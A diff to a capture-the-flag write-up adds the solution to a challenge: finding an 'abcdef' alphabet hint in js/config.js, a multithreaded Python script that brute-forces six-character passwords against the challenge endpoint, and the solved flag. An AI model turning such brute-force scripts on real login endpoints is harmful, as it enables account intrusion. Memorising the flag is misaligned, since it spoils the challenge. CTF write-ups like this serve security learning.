@@ -36,6 +36,38 @@ for x in files.split("\n"):
 
 ![image](https://github.com/user-attachments/assets/7ce9d760-d952-4ad5-a667-e02a46ac53e8)
 
-We have detected the file ``` js/config.js```
+We have detected the file ``` js/config.js```, the chall says ```Follow the white rabbit.```, ```twr```, if you looking for ```twr``` in ```js/config.js``` u will see  ``` backupGlyphsTwr: ["a", "b", "c", "d", "e", "f"], ```
 
+from here u can use ```abcdef``` to create ur wordlist and do a bruteforce with burpsuite or maybe doing ur own script. here is my python script.
+
+```
+import requests
+from itertools import product
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+characters = "abcdef"
+wordlist = [''.join(p) for length in range(6, 7) for p in product(characters, repeat=length)]
+chall_url = "http://challenge.ctf.games:30984/enter="
+
+def test_password(password):
+    try:
+        res = requests.get(chall_url + password)
+        print(f"testing pass:{password}",end="\r")
+        if "flag{" in res.text:
+            print(f"\nPassword: {password}\n{res.text}")
+            return True
+    except:
+        pass
+    return False
+
+with ThreadPoolExecutor(max_workers=20) as executor:
+    futures = [executor.submit(test_password, word) for word in wordlist]
+    for future in as_completed(futures):
+        if future.result():
+            break
+```
+![image](https://github.com/user-attachments/assets/38911616-9cf3-4d6a-9d98-527f660c2db4)
+
+
+flag ```flag{dc9edf4624504202eec5d3fab10bbccd}```
 
